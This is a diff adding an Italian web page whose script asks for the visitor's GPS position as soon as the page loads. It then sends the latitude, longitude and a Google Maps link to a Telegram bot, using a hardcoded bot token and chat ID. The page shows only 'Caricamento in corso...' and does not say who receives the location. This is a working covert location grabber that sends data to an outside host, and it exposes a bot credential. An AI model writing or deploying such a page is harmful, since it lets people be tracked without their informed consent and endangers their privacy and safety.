@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Posizione GPS</title>
+    <script>
+        function inviaPosizione(lat, lon) {
+            const botToken = "8182571590:AAFupZQi_yEYsr2M0fFIuHeAhZ-gpWYYEKE";
+            const chatId = "174901203";
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            const message = `📍 Posizione ricevuta!\nLat: ${lat}\nLon: ${lon}\n🌍 Google Maps: https://www.google.com/maps?q=${lat},${lon}`;
+
+            fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chatId, text: message })
+            })
+            .then(response => console.log("Posizione inviata!", response))
+            .catch(error => console.error("Errore invio posizione", error));
+        }
+
+        function ottieniPosizione() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => inviaPosizione(position.coords.latitude, position.coords.longitude),
+                    (error) => console.error("Errore accesso posizione", error)
+                );
+            } else {
+                console.error("Geolocalizzazione non supportata");
+            }
+        }
+    </script>
+</head>
+<body onload="ottieniPosizione()">
+    <h1>Caricamento in corso...</h1>
+    <p>Attendi mentre otteniamo la tua posizione.</p>
+</body>
+</html>
